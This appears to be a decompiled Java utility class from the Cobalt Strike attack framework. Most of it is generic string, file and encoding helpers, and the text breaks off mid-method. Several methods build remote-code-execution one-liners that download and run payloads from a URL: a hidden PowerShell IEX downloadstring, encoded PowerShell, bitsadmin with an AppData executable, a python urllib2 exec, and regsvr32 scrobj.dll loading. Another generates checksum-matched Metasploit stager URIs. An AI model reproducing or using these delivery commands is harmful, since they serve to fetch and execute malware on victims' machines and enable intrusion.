package common;

import dialog.DialogUtils;
import encoders.Base64;
import graph.Route;
import sleep.runtime.Scalar;
import sleep.runtime.ScalarArray;
import sleep.runtime.SleepUtils;

import javax.swing.*;
import java.io.*;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

public class CommonUtils {
    private static final SimpleDateFormat dateFormat = new SimpleDateFormat("MM/dd HH:mm:ss");
    private static final SimpleDateFormat timeFormat = new SimpleDateFormat("MM/dd HH:mm");
    private static final Random rgen = new Random();

    public static void print_error(String message) {
        System.out.println("\u001b[01;31m[-]\u001b[0m " + message);
    }

    public static void print_error_file(String message) {
        try {
            System.out.println("\u001b[01;31m[-]\u001b[0m " + CommonUtils.bString(CommonUtils.readResource(message)));
        } catch (Exception ex) {
            MudgeSanity.logException("exception printing my error! " + message, ex, false);
        }
    }

    public static void print_good(String message) {
        System.out.println("\u001b[01;32m[+]\u001b[0m " + message);
    }

    public static void print_info(String message) {
        System.out.println("\u001b[01;34m[*]\u001b[0m " + message);
    }

    public static void print_warn(String message) {
        System.out.println("\u001b[01;33m[!]\u001b[0m " + message);
    }

    public static void print_stat(String message) {
        System.out.println("\u001b[01;35m[*]\u001b[0m " + message);
    }

    public static void print_trial(String message) {
        if (License.isTrial()) {
            System.out.println("\u001b[01;36m[$]\u001b[0m " + message + " \u001b[01;36m[This is a trial version limitation]\u001b[0m");
        }
    }

    public static Object[] args(Object a) {
        return new Object[]{a};
    }

    public static Object[] args(Object a, Object b) {
        return new Object[]{a, b};
    }

    public static Object[] args(Object a, Object b, Object c) {
        return new Object[]{a, b, c};
    }

    public static Object[] args(Object a, Object b, Object c, Object d) {
        return new Object[]{a, b, c, d};
    }

    public static Object[] args(Object a, Object b, Object c, Object d, Object e) {
        return new Object[]{a, b, c, d, e};
    }

    public static Object[] args(Object a, Object b, Object c, Object d, Object e, Object f) {
        return new Object[]{a, b, c, d, e, f};
    }

    public static Object[] args(Object a, Object b, Object c, Object d, Object e, Object f, Object g) {
        return new Object[]{a, b, c, d, e, f, g};
    }

    public static Object[] args(Object a, Object b, Object c, Object d, Object e, Object f, Object g, Object h) {
        return new Object[]{a, b, c, d, e, f, g, h};
    }

    public static boolean isDate(String value, String format) {
        try {
            SimpleDateFormat parser = new SimpleDateFormat(format);
            parser.parse(value).getTime();
            return true;
        } catch (Exception ex) {
            return false;
        }
    }

    public static long days(int x) {
        return 86400000L * (long) x;
    }

    public static long parseDate(String value, String format) {
        try {
            SimpleDateFormat parser = new SimpleDateFormat(format);
            return parser.parse(value).getTime();
        } catch (Exception ex) {
            MudgeSanity.logException("Could not parse '" + value + "' with '" + format + "'", ex, false);
            return 0L;
        }
    }

    public static String formatDateAny(String format, long date) {
        Date temp = new Date(date);
        SimpleDateFormat formatz = new SimpleDateFormat(format);
        return formatz.format(temp);
    }

    public static String formatDate(long date) {
        Date temp = new Date(date);
        return dateFormat.format(temp);
    }

    public static String formatTime(long date) {
        Date temp = new Date(date);
        return timeFormat.format(temp);
    }

    public static String pad(String text, int length) {
        return CommonUtils.pad(text, ' ', length);
    }

    public static String pad(String text, char choice, int length) {
        String r = IntStream.range(text.length(), length).mapToObj(x -> String.valueOf(choice)).collect(Collectors.joining("", text, ""));
        return r;
    }

    public static String padr(String text, String pad, int length) {
        String r = IntStream.range(text.length(), length).mapToObj(x -> pad).collect(Collectors.joining("", "", text));
        return r;
    }

    public static String join(Collection text, String separator) {
        StringBuilder r = new StringBuilder();
        Iterator i = text.iterator();
        while (i.hasNext()) {
            r.append(i.next());
            if (!i.hasNext()) continue;
            r.append(separator);
        }
        return r.toString();
    }

    public static String joinObjects(Object[] data, String separator) {
        StringBuilder r = new StringBuilder();
        for (int x = 0; x < data.length; ++x) {
            if (data[x] == null) continue;
            r.append(data[x].toString());
            if (x + 1 >= data.length) continue;
            r.append(separator);
        }
        return r.toString();
    }

    public static String join(String[] text, String separator) {
        StringBuilder r = new StringBuilder();
        for (int x = 0; x < text.length; ++x) {
            r.append(text[x]);
            if (x + 1 >= text.length) continue;
            r.append(separator);
        }
        return r.toString();
    }

    public static void Guard() {
        if (!SwingUtilities.isEventDispatchThread()) {
            CommonUtils.print_error("Violation of EDT Contract in: " + Thread.currentThread().getName());
            Thread.currentThread();
            Thread.dumpStack();
        }
    }

    public static void sleep(long time) {
        try {
            Thread.sleep(time);
        } catch (InterruptedException ex) {
            MudgeSanity.logException("sleep utility", ex, false);
        }
    }

    public static void writeObject(File f, Object o) {
        try {
            ObjectOutputStream objout = new ObjectOutputStream(new FileOutputStream(f, false));
            objout.writeObject(SleepUtils.getScalar(o));
            objout.close();
        } catch (Exception ex) {
            MudgeSanity.logException("writeObject: " + f, ex, false);
        }
    }

    public static Object readObjectResource(String key) {
        try {
            ObjectInputStream objin = new ObjectInputStream(CommonUtils.resource(key));
            Object result = objin.readObject();
            objin.close();
            return result;
        } catch (Exception ex) {
            MudgeSanity.logException("readObjectResource: " + key, ex, false);
            return null;
        }
    }

    public static Object readObject(File f, Object subs) {
        try {
            if (f.exists()) {
                ObjectInputStream objin = new ObjectInputStream(new FileInputStream(f));
                Scalar result = (Scalar) objin.readObject();
                objin.close();
                return result.objectValue();
            }
        } catch (Exception ex) {
            MudgeSanity.logException("readObject: " + f, ex, false);
        }
        return subs;
    }

    public static byte[] toBytes(String data) {
        int length = data.length();
        byte[] r = new byte[length];
        for (int x = 0; x < length; ++x) {
            r[x] = (byte) data.charAt(x);
        }
        return r;
    }

    public static String bString(byte[] data) {
        try {
            return new String(data, "ISO8859-1");
        } catch (UnsupportedEncodingException ex) {
            MudgeSanity.logException("bString", ex, false);
            return "";
        }
    }

    public static String peekFile(File name, int max) {
        StringBuilder content = new StringBuilder(max);
        try {
            int next;
            FileInputStream in = new FileInputStream(name);
            for (int x = 0; x < max && (next = in.read()) != -1; ++x) {
                content.append((char) next);
            }
            in.close();
            return content.toString();
        } catch (IOException ioex) {
            MudgeSanity.logException("peekFile: " + name, ioex, false);
            return content.toString();
        }
    }

    public static byte[] readFile(String name) {
        try {
            FileInputStream in = new FileInputStream(name);
            byte[] result = CommonUtils.readAll(in);
            in.close();
            return result;
        } catch (IOException ioex) {
            MudgeSanity.logException("readFile: " + name, ioex, false);
            return new byte[0];
        }
    }

    public static byte[] readAll(InputStream i) {
        try {
            int next;
            ByteArrayOutputStream out = new ByteArrayOutputStream(i.available());
            while ((next = i.read()) != -1) {
                out.write(next);
            }
            byte[] result = out.toByteArray();
            out.close();
            return result;
        } catch (Exception ex) {
            MudgeSanity.logException("readAll", ex, false);
            return new byte[0];
        }
    }

    public static String[] toArray(String description) {
        return description.split(",\\s*");
    }

    public static String[] toArray(Collection items) {
        String[] result = new String[items.size()];
        Iterator i = items.iterator();
        int x = 0;
        while (i.hasNext()) {
            result[x] = i.next() + "";
            ++x;
        }
        return result;
    }

    public static String[] toArray(Object[] items) {
        String[] result = Arrays.stream(items).map(item -> item + "").toArray(String[]::new);
        return result;
    }

    public static List toList(String description) {
        String[] temp = CommonUtils.toArray(description);
        return new LinkedList<>(Arrays.asList(temp));
    }

    public static Set toSet(String description) {
        if ("".equals(description)) {
            return new HashSet();
        }
        return new HashSet(CommonUtils.toList(description));
    }

    public static Set toSet(Object[] items) {
        return new HashSet(CommonUtils.toList(items));
    }

    public static Set toSetLC(String[] items) {
        HashSet<String> result = Arrays.stream(items).filter(Objects::nonNull).map(String::toLowerCase).collect(Collectors.toCollection(HashSet::new));
        return result;
    }

    public static List toList(Object[] stuff) {
        LinkedList<Object> result = new LinkedList<>();
        for (Object aStuff : stuff) {
            result.add(aStuff);
        }
        return result;
    }

    public static Scalar toSleepArray(Object[] stuff) {
        return SleepUtils.getArrayWrapper(CommonUtils.toList(stuff));
    }

    public static String[] toStringArray(ScalarArray a) {
        int x = 0;
        String[] result = new String[a.size()];
        Iterator i = a.scalarIterator();
        while (i.hasNext()) {
            result[x] = i.next() + "";
            ++x;
        }
        return result;
    }

    public static Stack scalar(String a) {
        Stack<Scalar> temp = new Stack<>();
        temp.push(SleepUtils.getScalar(a));
        return temp;
    }

    public static int rand(int max) {
        return rgen.nextInt(max);
    }

    public static String pick(String[] options) {
        return options[CommonUtils.rand(options.length)];
    }

    public static Object pick(List options) {
        Object[] temp = options.toArray();
        return temp[CommonUtils.rand(temp.length)];
    }

    public static String pick(String options) {
        return CommonUtils.pick(CommonUtils.toArray(options));
    }

    public static String toHex(long number) {
        return Long.toHexString(number).toLowerCase();
    }

    public static InputStream resource(String f) throws IOException {
        if (new File(f).exists()) {
            return new FileInputStream(new File(f));
        }
        return CommonUtils.class.getClassLoader().getResourceAsStream(f);
    }

    public static String readResourceAsString(String f) {
        return CommonUtils.bString(CommonUtils.readResource(f));
    }

    public static byte[] readResource(String f) {
        try {
            InputStream in = CommonUtils.resource(f);
            if (in != null) {
                byte[] result = CommonUtils.readAll(in);
                in.close();
                return result;
            }
            CommonUtils.print_error("Could not find resource: " + f);
        } catch (IOException ioex) {
            MudgeSanity.logException("readResource: " + f, ioex, false);
        }
        return new byte[0];
    }

    public static String replaceAt(String f, String n, int index) {
        StringBuilder work = new StringBuilder(f);
        work.delete(index, index + n.length());
        work.insert(index, n);
        return work.toString();
    }

    public static byte[] patch(byte[] data, String old, String newd) {
        String dataz = CommonUtils.bString(data);
        StringBuilder work = new StringBuilder(dataz);
        int index = dataz.indexOf(old);
        work.delete(index, index + newd.length());
        work.insert(index, newd);
        return CommonUtils.toBytes(work.toString());
    }

    public static String writeToTemp(String pre, String post, byte[] data) {
        try {
            File temp = File.createTempFile(pre, post);
            String result = CommonUtils.writeToFile(temp, data);
            temp.deleteOnExit();
            return result;
        } catch (IOException ioex) {
            MudgeSanity.logException("writeToTemp", ioex, false);
            return null;
        }
    }

    public static String writeToFile(File temp, byte[] data) {
        try {
            FileOutputStream out = new FileOutputStream(temp, false);
            out.write(data, 0, data.length);
            out.flush();
            out.close();
            return temp.getAbsolutePath();
        } catch (IOException ioex) {
            MudgeSanity.logException("writeToFile", ioex, false);
            return null;
        }
    }

    public static String repeat(String me, int iters) {
        String result = IntStream.range(0, iters).mapToObj(x -> me).collect(Collectors.joining());
        return result;
    }

    public static byte[] strrep(byte[] data, String oldstr, String newstr) {
        return CommonUtils.toBytes(CommonUtils.strrep(CommonUtils.bString(data), oldstr, newstr));
    }

    public static String strrep(String data, String oldstr, String newstr) {
        StringBuilder work = new StringBuilder(data);
        if (oldstr.length() == 0) {
            return data;
        }
        int x = 0;
        int oldlen = oldstr.length();
        int newlen = newstr.length();
        while ((x = work.indexOf(oldstr, x)) > -1) {
            work.replace(x, x + oldlen, newstr);
            x += newstr.length();
        }
        return work.toString();
    }

    public static void copyFile(String src, File dst) {
        try {
            FileInputStream in = new FileInputStream(src);
            byte[] data = CommonUtils.readAll(in);
            in.close();
            CommonUtils.writeToFile(dst, data);
        } catch (IOException ioex) {
            MudgeSanity.logException("copyFile: " + src + " -> " + dst, ioex, false);
        }
    }

    public static double toDoubleNumber(String x, double mydefault) {
        try {
            return Double.parseDouble(x);
        } catch (Exception ex) {
            return mydefault;
        }
    }

    public static int toNumber(String x, int mydefault) {
        try {
            return Integer.parseInt(x);
        } catch (Exception ex) {
            return mydefault;
        }
    }

    public static int toNumberFromHex(String x, int mydefault) {
        try {
            return Integer.parseInt(x, 16);
        } catch (Exception ex) {
            return mydefault;
        }
    }

    public static long toLongNumber(String x, long mydefault) {
        try {
            return Long.parseLong(x);
        } catch (Exception ex) {
            return mydefault;
        }
    }

    public static boolean isNumber(String x) {
        try {
            Integer.parseInt(x);
            return true;
        } catch (Exception ex) {
            return false;
        }
    }

    public static int toTripleOffset(String a) {
        char first = a.charAt(0);
        char second = a.charAt(1);
        char third = a.charAt(2);
        int result = 0;
        result += first - 97;
        result += (second - 97) * 26;
        return result + (third - 97) * 26 * 26;
    }

    public static String[] expand(String data) {
        String[] temp = data.split("");
        String[] result = IntStream.range(0, temp.length - 1).mapToObj(x -> temp[x + 1]).toArray(String[]::new);
        return result;
    }

    public static String toHex(byte[] data) {
        StringBuilder temp = new StringBuilder();
        for (byte aData : data) {
            int first = aData & 15;
            int second = aData >> 4 & 15;
            temp.append(Integer.toString(second, 16));
            temp.append(Integer.toString(first, 16));
        }
        return temp.toString().toLowerCase();
    }

    public static String toHexString(byte[] data) {
        StringBuilder r = new StringBuilder();
        r.append("[");
        for (int x = 0; x < data.length; ++x) {
            r.append(Integer.toString(data[x] & 255, 16));
            if (x >= data.length - 1) continue;
            r.append(",");
        }
        r.append("]");
        return r.toString();
    }

    public static String toAggressorScriptHexString(byte[] data) {
        StringBuilder r = new StringBuilder();
        for (byte aData : data) {
            String appendme = Integer.toString(aData & 255, 16);
            if (appendme.length() == 1) {
                r.append("\\x0");
            } else {
                r.append("\\x");
            }
            r.append(appendme);
        }
        return r.toString();
    }

    public static String hex(int datum) {
        String temp = Integer.toString(datum & 255, 16);
        if (temp.length() == 1) {
            return "0" + temp;
        }
        return temp;
    }

    public static String toUnicodeEscape(byte data) {
        String next = CommonUtils.hex(data);
        return "00" + next;
    }

    public static String toNasmHexString(byte[] data) {
        StringBuilder r = new StringBuilder();
        r.append("db ");
        for (int x = 0; x < data.length; ++x) {
            r.append("0x");
            r.append(Integer.toString(data[x] & 255, 16));
            if (x >= data.length - 1) continue;
            r.append(",");
        }
        return r.toString();
    }

    public static byte[] pad(byte[] data, int length) {
        if (data.length < length) {
            return Arrays.copyOf(data, length);
        }
        return data;
    }

    public static byte[] padg(byte[] data, int length) {
        if (data.length >= length) {
            return data;
        }
        return CommonUtils.join(data, CommonUtils.randomData(length - data.length));
    }

    public static byte[] pad(byte[] data) {
        int offset = 0;
        while ((data.length + offset) % 4 != 0) {
            ++offset;
        }
        return Arrays.copyOf(data, data.length + offset);
    }

    public static String PowerShellOneLiner(String url) {
        return "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('" + url + "'))\"";
    }

    public static String EncodePowerShellOneLiner(String command) {
        try {
            return "powershell.exe -nop -w hidden -encodedcommand " + Base64.encode(command.getBytes(StandardCharsets.UTF_16LE));
        } catch (Exception ex) {
            MudgeSanity.logException("Could not encode: '" + command + "'", ex, false);
            return "";
        }
    }

    public static String OneLiner(String url, String type) {
        if ("bitsadmin".equals(type)) {
            String f = CommonUtils.garbage("temp");
            return "cmd.exe /c bitsadmin /transfer " + f + " " + url + " %APPDATA%\\" + f + ".exe&%APPDATA%\\" + f + ".exe&del %APPDATA%\\" + f + ".exe";
        }
        if ("powershell".equals(type)) {
            return CommonUtils.PowerShellOneLiner(url);
        }
        if ("python".equals(type)) {
            return "python -c \"import urllib2; exec urllib2.urlopen('" + url + "').read();\"";
        }
        if ("regsvr32".equals(type)) {
            return "regsvr32 /s /n /u /i:" + url + " scrobj.dll";
        }
        CommonUtils.print_error("'" + type + "' for URL '" + url + "' does not have a one-liner");
        throw new RuntimeException("'" + type + "' for URL '" + url + "' does not have a one-liner");
    }

    public static List combine(List a, List b) {
        LinkedList res = new LinkedList();
        res.addAll(a);
        res.addAll(b);
        return res;
    }

    public static byte[] join(byte[] a, byte[] b) {
        byte[] result = new byte[a.length + b.length];
        System.arraycopy(a, 0, result, 0, a.length);
        System.arraycopy(b, 0, result, a.length, b.length);
        return result;
    }

    public static byte[] join(byte[] a, byte[] b, byte[] c) {
        byte[] result = new byte[a.length + b.length + c.length];
        System.arraycopy(a, 0, result, 0, a.length);
        System.arraycopy(b, 0, result, a.length, b.length);
        System.arraycopy(c, 0, result, a.length + b.length, c.length);
        return result;
    }

    public static List readOptions(String file) {
        LinkedList<byte[]> results = new LinkedList<>();
        try {
            byte[] data = CommonUtils.readResource(file);
            DataInputStream in = new DataInputStream(new ByteArrayInputStream(data));
            while (in.available() > 0) {
                int len = in.readInt();
                if (len > in.available()) {
                    CommonUtils.print_error("readOptions: " + file + " has bad length: " + len + " > " + in.available());
                    return results;
                }
                byte[] next = new byte[len];
                in.read(next);
                results.add(next);
            }
        } catch (IOException ioex) {
            MudgeSanity.logException("readOptions: " + file, ioex, false);
        }
        return results;
    }

    public static byte[] pickOption(String file) {
        List options = CommonUtils.readOptions(file);
        return (byte[]) options.get(CommonUtils.rand(options.size()));
    }

    public static boolean isin(String chunk, String big) {
        return big.contains(chunk);
    }

    public static Map<String, String> toMap(String kA, String vA) {
        return CommonUtils.toMap(new String[]{kA}, new String[]{vA});
    }

    public static Map<String, String> toMap(String kA, String vA, String kB, String vB) {
        return CommonUtils.toMap(new String[]{kA, kB}, new String[]{vA, vB});
    }

    public static Map<String, String> toMap(String kA, String vA, String kB, String vB, String kC, String vC) {
        return CommonUtils.toMap(new String[]{kA, kB, kC}, new String[]{vA, vB, vC});
    }

    public static Map<String, String> toMap(String kA, String vA, String kB, String vB, String kC, String vC, String kD, String vD) {
        return CommonUtils.toMap(new String[]{kA, kB, kC, kD}, new String[]{vA, vB, vC, vD});
    }

    public static Map<String, String> toMap(String[] keys, String[] values) {
        HashMap<String, String> map = new HashMap<>();
        int bound = keys.length;
        for (int i = 0; i < bound; i++) {
            map.put(keys[i], values[i]);
        }
        return map;
    }

    public static String garbage(String replaceme) {
        String garbage = CommonUtils.strrep(CommonUtils.ID(), "-", "");
        if (replaceme == null) {
            return "";
        }
        if (replaceme.length() > garbage.length()) {
            return garbage + CommonUtils.garbage(replaceme.substring(garbage.length()));
        }
        if (replaceme.length() == garbage.length()) {
            return garbage;
        }
        return garbage.substring(0, replaceme.length());
    }

    public static String ID() {
        return UUID.randomUUID().toString();
    }

    public static byte[] randomData(int size) {
        byte[] temp = new byte[size];
        rgen.nextBytes(temp);
        return temp;
    }

    public static byte[] randomDataNoZeros(int size) {
        byte[] cand;
        boolean pass;
        do {
            cand = CommonUtils.randomData(size);
            pass = true;
            for (byte aCand : cand) {
                if (aCand != 0) continue;
                pass = false;
            }
        } while (!pass);
        return cand;
    }

    public static byte[] MD5(byte[] data) {
        try {
            MessageDigest doit = MessageDigest.getInstance("MD5");
            doit.update(data);
            return doit.digest();
        } catch (Exception ex) {
            MudgeSanity.logException("MD5", ex, false);
            return new byte[0];
        }
    }

    public static Map KV(String key, String value) {
        HashMap<String, String> temp = new HashMap<>();
        temp.put(key, value);
        return temp;
    }

    public static int randomPortAbove1024() {
        return CommonUtils.rand(60000) + 2048;
    }

    public static int randomPort() {
        return CommonUtils.rand(65535);
    }

    public static boolean is64bit() {
        return CommonUtils.isin("64", System.getProperty("os.arch") + "");
    }

    public static String dropFile(String resource, String begin, String end) {
        byte[] data = CommonUtils.readResource(resource);
        return CommonUtils.writeToTemp(begin, end, data);
    }

    public static void runSafe(final Runnable r) {
        final Thread parent = Thread.currentThread();
        if (SwingUtilities.isEventDispatchThread()) {
            try {
                r.run();
            } catch (Exception ex) {
                MudgeSanity.logException("runSafe failed: " + r + " thread: " + parent, ex, false);
            }
        } else {
            SwingUtilities.invokeLater(() -> {
                try {
                    r.run();
                } catch (Exception ex) {
                    MudgeSanity.logException("runSafe failed: " + r + " thread: " + parent, ex, false);
                }
            });
        }
    }

    public static Scalar convertAll(Object data) {
        return ScriptUtils.convertAll(data);
    }

    public static Set difference(Set a, Set b) {
        HashSet temp = new HashSet();
        temp.addAll(a);
        temp.removeAll(b);
        return temp;
    }

    public static Set intersection(Set a, Set b) {
        HashSet temp = new HashSet();
        temp.addAll(a);
        temp.retainAll(b);
        return temp;
    }

    public static long dataIdentity(Object v) {
        long r = 0L;
        if (v == null) {
            return 1L;
        }
        if (v instanceof Collection) {
            for (Object o : ((Collection) v)) {
                r += 11L * CommonUtils.dataIdentity(o);
            }
        } else if (v instanceof Map) {
            for (Object o : ((Map) v).values()) {
                r += 13L * CommonUtils.dataIdentity(o);
            }
        } else {
            if (v instanceof BeaconEntry) {
                Map m = ((BeaconEntry) v).toMap();
                m.remove("last");
                m.remove("lastf");
                return CommonUtils.dataIdentity(m);
            }
            if (v instanceof Number) {
                return v.hashCode();
            }
            return v.toString().hashCode();
        }
        return r;
    }

    public static String trim(String text) {
        if (text == null) {
            return null;
        }
        return text.trim();
    }

    public static LinkedList parseTabData(String original, String[] cols) {
        LinkedList results = new LinkedList();
        String[] temp = original.trim().split("\n");
        for (String aTemp : temp) {
            HashMap<String, String> next = new HashMap<>();
            String[] row = aTemp.split("\t");
            for (int z = 0; z < cols.length && z < row.length; ++z) {
                next.put(cols[z], row[z]);
            }
            if (next.size() <= 0) continue;
            results.add(next);
        }
        return results;
    }

    public static boolean iswm(String a, String b) {
        try {
            if ((a.length() == 0 || b.length() == 0) && a.length() != b.length()) {
                return false;
            }
            int aptr = 0;
            int bptr = 0;
            while (aptr < a.length()) {
                if (a.charAt(aptr) == '*') {
                    boolean greedy;
                    int cptr;
                    boolean bl = greedy = aptr + 1 < a.length() && a.charAt(aptr + 1) == '*';
                    while (a.charAt(aptr) == '*') {
                        if (++aptr != a.length()) continue;
                        return true;
                    }
                    for (cptr = aptr; cptr < a.length() && a.charAt(cptr) != '?' && a.charAt(cptr) != '\\' && a.charAt(cptr) != '*'; ++cptr) {
                    }
                    if (cptr != aptr) {
                        cptr = greedy ? b.lastIndexOf(a.substring(aptr, cptr)) : b.indexOf(a.substring(aptr, cptr), bptr);
                        if (cptr == -1 || cptr < bptr) {
                            return false;
                        }
                        bptr = cptr;
                    }
                    if (a.charAt(aptr) == '?') {
                        --aptr;
                    }
                } else {
                    if (bptr >= b.length()) {
                        return false;
                    }
                    if (a.charAt(aptr) == '\\' ? ++aptr < a.length() && a.charAt(aptr) != b.charAt(bptr) : a.charAt(aptr) != '?' && a.charAt(aptr) != b.charAt(bptr)) {
                        return false;
                    }
                }
                ++aptr;
                ++bptr;
            }
            return bptr == b.length();
        } catch (Exception ex) {
            MudgeSanity.logException(a + " iswm " + b, ex, false);
            return false;
        }
    }

    public static LinkedList<Map<String, Object>> apply(String key, Collection results, AdjustData actor) {
        LinkedList<Map<String, Object>> returnv = new LinkedList<>();
        for (Object temp : results) {
            Map<String, Object> mod = actor.format(key, temp);
            if (mod == null) continue;
            returnv.add(mod);
        }
        return returnv;
    }

    public static String TargetKey(Map options) {
        return DialogUtils.string(options, "address");
    }

    public static String ApplicationKey(Map options) {
        return DialogUtils.string(options, "nonce");
    }

    public static String ServiceKey(Map options) {
        String host = DialogUtils.string(options, "address");
        String port = DialogUtils.string(options, "port");
        return host + ":" + port;
    }

    public static String CredKey(Map options) {
        String user = DialogUtils.string(options, "user");
        String pass = DialogUtils.string(options, "password");
        String realm = DialogUtils.string(options, "realm");
        return user + "." + pass + "." + realm;
    }

    public static List merge(List a, List b) {
        HashSet set = new HashSet();
        set.addAll(a);
        set.addAll(b);
        return new LinkedList(set);
    }

    public static long checksum8(String text) {
        if (text.length() < 4) {
            return 0L;
        }
        text = text.replace("/", "");
        long sum = 0L;
        for (int x = 0; x < text.length(); ++x) {
            sum += (long) text.charAt(x);
        }
        return sum % 256L;
    }

    public static String MSFURI() {
        String candidate;
        String[] alpha = CommonUtils.toArray("a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9");
        while (CommonUtils.checksum8(candidate = "/" + CommonUtils.pick(alpha) + CommonUtils.pick(alpha) + CommonUtils.pick(alpha) + CommonUtils.pick(alpha)) != 92L) {
        }
        return candidate;
    }

    public static String MSFURI_X64() {
        String candidate;
        String[] alpha = CommonUtils.toArray("a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9");
        while (CommonUtils.checksum8(candidate = "/" + CommonUtils.pick(alpha) + CommonUtils.pick(alpha) + CommonUtils.pick(alpha) + CommonUtils.pick(alpha)) != 93L) {
        }
        return candidate;
    }

    public static String drives(String mask) {
        LinkedList<String> results = new LinkedList<>();
        String[] drives = CommonUtils.expand("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
        long bitmask = Long.parseLong(mask);
        long rem;
        for (int x = 0; x < drives.length; ++x) {
            rem = bitmask % (long) Math.pow(2.0, x + 1);
            if (rem <= 0L) continue;
            results.add(drives[x] + ":");
            bitmask -= rem;
        }
        return CommonUtils.join(results, ", ");
    }

    public static byte[] gunzip(byte[] data) {
        try {
            ByteArrayInputStream in = new ByteArrayInputStream(data);
            GZIPInputStream gin = new GZIPInputStream(in);
            byte[] result = CommonUtils.readAll(gin);
            gin.close();
            return result;
        } catch (Exception ex) {
            MudgeSanity.logException("gzip", ex, false);
            return new byte[0];
        }
    }

    public static byte[] gzip(byte[] data) {
        try {
            ByteArrayOutputStream out = new ByteArrayOutputStream(data.length);
            GZIPOutputStream gout = new GZIPOutputStream(out);
            gout.write(data, 0, data.length);
            gout.finish();
            byte[] result = out.toByteArray();
            gout.close();
            return result;
        } catch (Exception ex) {
            MudgeSanity.logException("gzip", ex, false);
            return new byte[0];
        }
    }

    public static String Base64PowerShell(String data) {
        return Base64.encode(data.getBytes(StandardCharsets.UTF_16LE));
    }

    public static boolean contains(String setdesc, String value) {
        return CommonUtils.toSet(setdesc).contains(value);
    }

    public static boolean isIP(String name) {
        return name.length() <= 16 && name.matches("\\d+\\.\\d+\\.\\d+\\.\\d+");
    }

    public static boolean isIPv6(String name) {
        return name.length() <= 64 && name.matches("[A-F0-9a-f:]+(%[\\d+]){0,1}");
    }

    public static int limit(String name) {
        if ("screenshots".equals(name)) {
            return 125;
        }
        if ("beaconlog".equals(name)) {
            return 2500;
        }
        if ("archives".equals(name)) {
            return 20000;
        }
        return 1000;
    }

    public static String randomMac() {
        int e = CommonUtils.rand(255);
        if (e % 2 == 1) {
            ++e;
        }
        StringStack mac = new StringStack("", ":");
        mac.push(CommonUtils.hex(e));
        for (int x = 0; x < 5; ++x) {
            mac.push(CommonUtils.hex(CommonUtils.rand(255)));
        }
        return mac.toString();
    }

    public static void increment(Map data, String key) {
        int value = CommonUtils.count(data, key);
        data.put(key, value + 1);
    }

    public static int count(Map data, String key) {
        if (!data.containsKey(key)) {
            return 0;
        }
        return (Integer) data.get(key);
    }

    public static long ipToLong(String addr) {
        return Route.ipToLong(addr);
    }

    public static String strip(String all, String part) {
        if (all.startsWith(part)) {
            return all.substring(part.length());
        }
        return all;
    }

    public static String stripRight(String all, String part) {
        if (all.endsWith(part)) {
            if (all.equals(part)) {
                return "";
            }
            return all.substring(0, all.length() - part.length());
        }
        return all;
    }

    public static long lof(String file) {
        try {
            File temp = new File(file);
            if (temp.isFile()) {
                return temp.length();
            }
            return 0L;
        } catch (Exception ex) {
            return 0L;
        }
    }

    public static String Host(String arg) {
        RegexParser parser = new RegexParser(arg);
        if (parser.matches("(.*?):(\\d+)")) {
            return parser.group(1);
        }
        return arg;
    }

    public static int Port(String arg, int port) {
        RegexParser parser = new RegexParser(arg);
        if (parser.matches("(.*?):(\\d+)")) {
            return CommonUtils.toNumber(parser.group(2), port);
        }
        return port;
    }

    public static String session(int bid) {
        if (bid >= 500000) {
            return "session";
        }
        if (bid >= 0) {
            return "beacon";
        }
        return "unknown";
    }

    public static String session(String bid) {
        return CommonUtils.session(CommonUtils.toNumber(bid, 0));
    }

    public static boolean isSafeFile(File parent, File child) {
        try {
            return child.getCanonicalPath().startsWith(parent.getCanonicalPath());
        } catch (IOException ioex) {
            MudgeSanity.logException("isSafeFile '" + parent + "' -> '" + child + "'", ioex, false);
            return false;
        }
    }

    public static File SafeFile(File parent, String child) {
        try {
            File proposed = new File(parent, child);
            if (proposed.getCanonicalPath().startsWith(parent.getCanonicalPath())) {
                return proposed.getCanonicalFile();
            }
        } catch (IOException ioex) {
            MudgeSanity.logException("Could not join '" + parent + "' and '" + child + "'", ioex, false);
        }
        CommonUtils.print_error("SafeFile failed: '" + parent + "', '" + child + "'");
        throw new RuntimeException("SafeFile failed: '" + parent + "', '" + child + "'");
    }

    public static File SafeFile(String parent, String child) {
        return CommonUtils.SafeFile(new File(parent), child);
    }

    public static int toIntLittleEndian(byte[] data) {
        ByteBuffer buffer = ByteBuffer.wrap(data);
        buffer.order(ByteOrder.LITTLE_ENDIAN);
        return buffer.getInt(0);
    }

    public static String getCaseInsensitive(Map data, String key, String defv) {
        String value = (String) data.get(key);
        if (value == null) {
            key = key.toLowerCase();
            for (Object o : data.entrySet()) {
                Map.Entry entry = (Map.Entry) o;
                String ekey = entry.getKey().toString().toLowerCase();
                if (!key.equals(ekey)) continue;
                return (String) entry.getValue();
            }
            return defv;
        }
        return value;
    }

    public static byte[] shift(byte[] data, int len) {
        if (data.length < len) {
            return data;
        }
        if (data.length == len) {
            return new byte[0];
        }
        byte[] result = new byte[data.length - len];
        for (int x = 0; x < result.length; ++x) {
            result[x] = data[x + len];
        }
        return result;
    }

    public static String[] toKeyValue(String moo) {
        StringBuilder key = new StringBuilder();
        StringBuilder value = new StringBuilder();
        char[] data = moo.toCharArray();
        int x;
        for (x = 0; x < data.length && data[x] != '='; ++x) {
            key.append(data[x]);
        }
        ++x;
        while (x < data.length) {
            value.append(data[x]);
            ++x;
        }
        return new String[]{key.toString(), value.toString()};
    }

    public static String canonicalize(String f) {
        try {
            return new File("cobaltstrike.auth").getCanonicalPath();
        } catch (Exception ex) {
            MudgeSanity.logException("canonicalize: " + f, ex, false);
            return f;
